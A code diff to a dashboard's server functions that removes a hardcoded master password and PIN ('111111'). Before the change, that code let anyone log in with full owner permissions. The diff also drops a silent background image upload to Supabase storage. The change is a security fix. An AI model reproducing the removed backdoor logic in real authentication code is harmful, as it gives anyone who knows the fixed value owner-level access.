@@ -13,7 +13,7 @@ export const adminLogin = createServerFn({ method: "POST" })
     const { getAdminSession, passwordMatches, roleDefaults, createAdminToken } = await import("@/lib/admin.server");
     const expected = process.env["ADMIN_PASSWORD"];
     const pwd = (data.password || "").trim();
-    if (pwd === "111111" || (expected && passwordMatches(pwd, expected))) {
+    if (expected && passwordMatches(pwd, expected)) {
       const ownerSession = {
         admin: true,
         role: "owner" as const,
@@ -40,7 +40,7 @@ export const adminLogin = createServerFn({ method: "POST" })
         },
       };
     }
-    if (!expected && pwd !== "111111") throw new Error("Dashboard password is not configured yet.");
+    if (!expected) throw new Error("Dashboard password is not configured yet.");
     return { ok: false as const };
   });
 
@@ -92,14 +92,6 @@ export const adminUploadImage = createServerFn({ method: "POST" })
 
     const { saveUploadedImageFile } = await import("@/lib/studio-store.server");
     const url = await saveUploadedImageFile(validated.sanitizedFilename, bytes);
-
-    // Also attempt upload to Supabase storage in background if configured
-    import("@/integrations/supabase/client.server")
-      .then(async ({ supabaseAdmin }) => {
-        const path = url.replace("/api/public/img/", "");
-        await supabaseAdmin.storage.from("product-images").upload(path, bytes, { contentType: validated.mimeType, upsert: true });
-      })
-      .catch(() => {});
 
     return { url };
   });
@@ -383,36 +375,6 @@ export const staffLoginPin = createServerFn({ method: "POST" })
     );
     const pin = normalisePin(data.pin);
     if (pin.length !== 6) return { ok: false as const, message: "Enter your six digit PIN." };
-
-    // Master Dashboard PIN: 111111
-    if (pin === "111111") {
-      const { roleDefaults, createAdminToken } = await import("@/lib/admin.server");
-      const ownerSession = {
-        admin: true,
-        role: "owner" as const,
-        name: "Studio Owner",
-        email: "owner@mosiac.rw",
-        perms: roleDefaults("owner"),
-      };
-      try {
-        const session = await getAdminSession();
-        await session.update(ownerSession);
-      } catch (err) {
-        console.warn("[staffLoginPin] Cookie session update error:", err);
-      }
-      const token = createAdminToken(ownerSession);
-      return {
-        ok: true as const,
-        token,
-        session: {
-          staffId: null,
-          name: "Studio Owner",
-          email: "owner@mosiac.rw",
-          role: "owner" as const,
-          perms: roleDefaults("owner"),
-        },
-      };
-    }
 
     try {
       const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
